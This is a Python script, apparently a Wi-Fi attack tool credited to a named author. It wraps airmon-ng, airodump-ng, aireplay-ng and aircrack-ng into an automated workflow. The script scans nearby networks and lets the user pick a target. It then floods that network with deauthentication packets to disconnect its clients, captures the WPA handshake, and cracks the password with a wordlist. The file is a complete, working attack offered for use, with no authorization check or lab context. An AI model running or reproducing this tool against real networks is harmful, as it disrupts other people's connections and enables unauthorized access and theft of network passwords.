#!/usr/bin/env python3
import os
import time
import subprocess
import re
import csv
from colorama import init, Fore, Style

# Initialize colorama
init()

# Ensure script run as root
if os.geteuid() != 0:
    print(f"{Fore.RED}{Style.BRIGHT}[-] This script must be run as root. Use sudo.{Style.RESET_ALL}")
    exit(1)

# List available WiFi interfaces
def list_wifi_interfaces():
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    interfaces = re.findall(r'^((?!wlan)\w+)', result.stdout, re.MULTILINE)
    wifi_interfaces = []
    for iface in interfaces:
        iface_info = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
        if "IEEE 802.11" in iface_info.stdout or "Wireless" in iface_info.stdout:
            wifi_interfaces.append(iface)
    return wifi_interfaces

# Enable monitor mode
def enable_monitor_mode(interface):
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Checking and enabling monitor mode on {interface}...{Style.RESET_ALL}")
    subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL)
    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
    if "Mode:Monitor" in result.stdout:
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] {interface} is already in monitor mode.{Style.RESET_ALL}")
        return interface
    subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL)
    mon_interface = f"{interface}mon"
    result = subprocess.run(['iwconfig', mon_interface], capture_output=True, text=True)
    if "Mode:Monitor" in result.stdout:
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] Monitor mode enabled: {mon_interface}{Style.RESET_ALL}")
        return mon_interface
    print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to enable monitor mode on {interface}.{Style.RESET_ALL}")
    exit(1)

# Scan networks
def scan_wifi_networks(interface):
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Scanning for Wi-Fi networks on {interface} (10 seconds)...{Style.RESET_ALL}")
    csv_file = "wifi_scan-01.csv"
    proc = subprocess.Popen(['airodump-ng', '--output-format', 'csv', '-w', 'wifi_scan', interface])
    time.sleep(10)
    proc.terminate()
    networks = []
    try:
        with open(csv_file, 'r') as f:
            reader = csv.reader(f)
            for row in reader:
                if len(row) > 13 and row[0].strip():
                    bssid = row[0].strip()
                    essid = row[13].strip() if row[13].strip() else "Hidden"
                    channel = row[3].strip()
                    encryption = row[5].strip()
                    signal = row[8].strip()
                    print(f"{Fore.YELLOW}[DEBUG] Processing signal value: '{signal}'{Style.RESET_ALL}")
                    try:
                        int_signal = int(signal)  # Convert signal to int for sorting
                        print(f"{Fore.YELLOW}[DEBUG] Signal converted to int: {int_signal}{Style.RESET_ALL}")
                    except ValueError:
                        print(f"{Fore.RED}{Style.BRIGHT}[DEBUG] Skipping invalid signal value: '{signal}'{Style.RESET_ALL}")
                        continue  # Skip this entry if signal isn’t numeric
                    networks.append({"BSSID": bssid, "ESSID": essid, "Channel": channel, "Encryption": encryption, "Signal": signal})
        os.remove(csv_file)
    except FileNotFoundError:
        print(f"{Fore.RED}{Style.BRIGHT}[-] Error: Could not read scan results.{Style.RESET_ALL}")
        return []
    return sorted(networks, key=lambda x: int(x["Signal"]), reverse=True)

# Deauthentication attack
def deauth_attack(interface, bssid, count=50):
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Performing deauth attack on BSSID: {bssid}...{Style.RESET_ALL}")
    proc = subprocess.Popen(['aireplay-ng', '--deauth', str(count), '-a', bssid, interface])
    time.sleep(5)
    proc.terminate()
    print(f"{Fore.GREEN}{Style.BRIGHT}[+] Sent {count} deauth packets.{Style.RESET_ALL}")

# Capture handshake
def capture_handshake(interface, bssid, channel):
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Capturing WPA handshake for {bssid} on channel {channel}...{Style.RESET_ALL}")
    subprocess.run(['iwconfig', interface, 'channel', channel])
    cap_file = "handshake.cap"
    proc = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', 'handshake', interface])
    time.sleep(180)
    proc.terminate()
    if os.path.exists(cap_file):
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] Handshake capture saved to {cap_file}{Style.RESET_ALL}")
        return cap_file
    print(f"{Fore.RED}{Style.BRIGHT}[-] Failed to capture handshake.{Style.RESET_ALL}")
    return None

# Crack password
def crack_password(cap_file, bssid, wordlist="/usr/share/wordlists/rockyou.txt"):
    if not os.path.exists(wordlist):
        print(f"{Fore.RED}{Style.BRIGHT}[-] Wordlist {wordlist} not found.{Style.RESET_ALL}")
        return None
    print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Cracking WPA password for {bssid}...{Style.RESET_ALL}")
    result = subprocess.run(['aircrack-ng', '-w', wordlist, '-b', bssid, cap_file], capture_output=True, text=True)
    if "KEY FOUND" in result.stdout:
        key = re.search(r"KEY FOUND!\s*\[(.*?)\]", result.stdout)
        if key:
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] Password found: {key.group(1)}{Style.RESET_ALL}")
            return key.group(1)
    print(f"{Fore.RED}{Style.BRIGHT}[-] Password not found in wordlist.{Style.RESET_ALL}")
    return None

# Main function
def main():
    mon_interface = None
    try:
        interfaces = list_wifi_interfaces()
        if not interfaces:
            print(f"{Fore.RED}{Style.BRIGHT}[-] No Wi-Fi interfaces found (excluding wlan*).{Style.RESET_ALL}")
            exit(1)
        print(f"{Fore.CYAN}{Style.BRIGHT}Available Wi-Fi interfaces: {interfaces}{Style.RESET_ALL}")
        #? Validate interface selection
        while True:
            selected_interface = input(f"{Fore.CYAN}{Style.BRIGHT}Select an interface: {Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[DEBUG] User entered interface: '{selected_interface}'{Style.RESET_ALL}")
            if selected_interface in interfaces:
                break
            print(f"{Fore.RED}{Style.BRIGHT}[-] Invalid interface. Please select from {interfaces}.{Style.RESET_ALL}")

        mon_interface = enable_monitor_mode(selected_interface)
        networks = scan_wifi_networks(mon_interface)
        if not networks:
            print(f"{Fore.RED}{Style.BRIGHT}[-] No networks found.{Style.RESET_ALL}")
            exit(1)

        print(f"\n{Fore.CYAN}{Style.BRIGHT}Available Wi-Fi Networks:{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{Style.BRIGHT}Idx  BSSID              ESSID              Channel  Encryption  Signal{Style.RESET_ALL}")
        for i, net in enumerate(networks):
            print(f"{Fore.WHITE}{Style.BRIGHT}{i:<4} {net['BSSID']:<17} {net['ESSID']:<18} {net['Channel']:<7} {net['Encryption']:<11} {net['Signal']} dBm{Style.RESET_ALL}")

        #? Robust input validation for network selection
        print(f"{Fore.YELLOW}[DEBUG] Entering network selection loop{Style.RESET_ALL}")
        while True:
            user_input = input(f"\n{Fore.CYAN}{Style.BRIGHT}Select a network by index (0-{len(networks)-1}): {Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[DEBUG] User entered network index: '{user_input}'{Style.RESET_ALL}")
            try:
                target_idx = int(user_input)
                print(f"{Fore.YELLOW}[DEBUG] Converted index to int: {target_idx}{Style.RESET_ALL}")
                if 0 <= target_idx < len(networks):
                    break
                else:
                    print(f"{Fore.RED}{Style.BRIGHT}[-] Invalid index. Please enter a number between 0 and {len(networks)-1}.{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}{Style.BRIGHT}[-] Invalid input. Please enter a number (e.g., 0, 1, etc.).{Style.RESET_ALL}")

        target = networks[target_idx]
        print(f"{Fore.GREEN}{Style.BRIGHT}[+] Targeting: {target['ESSID']} ({target['BSSID']}) on channel {target['Channel']}{Style.RESET_ALL}")

        if "WPA" in target["Encryption"]:
            deauth_attack(mon_interface, target["BSSID"])
            handshake_file = capture_handshake(mon_interface, target["BSSID"], target["Channel"])
            if handshake_file:
                password = crack_password(handshake_file, target["BSSID"])
                os.remove(handshake_file)
        else:
            print(f"{Fore.RED}{Style.BRIGHT}[-] Only WPA/WPA2 networks are supported for cracking.{Style.RESET_ALL}")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}{Style.BRIGHT}[*] Stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[-] An error occurred: {e}{Style.RESET_ALL}")
    finally:
        if mon_interface:
            subprocess.run(['airmon-ng', 'stop', mon_interface], stdout=subprocess.DEVNULL)
            print(f"{Fore.YELLOW}{Style.BRIGHT}[*] Monitor mode disabled.{Style.RESET_ALL}")
        subprocess.run(['sudo', 'service', 'NetworkManager', 'start'], stdout=subprocess.DEVNULL)
        print(f"{Fore.YELLOW}{Style.BRIGHT}[*] NetworkManager restarted.{Style.RESET_ALL}")


if __name__ == "__main__":
    
    subprocess.run('clear')
    print()
    print(f"{Fore.MAGENTA}{Style.BRIGHT} █████   ███   █████  ███  ███████████            ███               █████{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}░░███   ░███  ░░███  ░░░  ░░███░░░░░░█           ░░░               ░░███ {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT} ░███   ░███   ░███  ████  ░███   █ ░  ████████  ████   ██████   ███████ {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT} ░███   ░███   ░███ ░░███  ░███████   ░░███░░███░░███  ███░░███ ███░░███ {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT} ░░███  █████  ███   ░███  ░███░░░█    ░███ ░░░  ░███ ░███████ ░███ ░███ {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}  ░░░█████░█████░    ░███  ░███  ░     ░███      ░███ ░███░░░  ░███ ░███ {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}    ░░███ ░░███      █████ █████       █████     █████░░██████ ░░████████{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}     ░░░   ░░░      ░░░░░ ░░░░░       ░░░░░     ░░░░░  ░░░░░░   ░░░░░░░░ {Style.RESET_ALL}")
    print()
    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}[+]  Creator    :  Pavin Das{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}[+]  GitHub     :  PavinDas{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}{Style.BRIGHT}[+]  Instagram  :  pavin__das{Style.RESET_ALL}")
    print()
    print()
    main()